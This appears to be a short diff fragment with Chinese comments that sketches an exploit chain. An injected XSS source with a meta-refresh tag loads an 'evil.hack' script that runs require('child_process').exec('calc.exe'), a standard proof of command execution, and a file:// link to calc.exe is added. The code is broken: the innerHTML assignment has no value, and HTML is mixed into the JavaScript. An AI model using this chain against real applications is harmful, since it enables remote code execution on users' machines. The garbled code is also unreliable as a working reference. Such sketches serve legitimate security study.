@@ -1,0 +1,7 @@
+// 这是 index.js 中的内容
+elm.innerHTML = ; // XSS!
+// 这是我们对 xss_source 的控制
+xss_source = '<meta http-equiv="refresh" content="0">';
+// 这是 evil.hack 中的<script>脚本内容
+require('child_process').exec('calc.exe',null);
+<a href="file://c:/windows/system32/calc.exe">Click</a>  
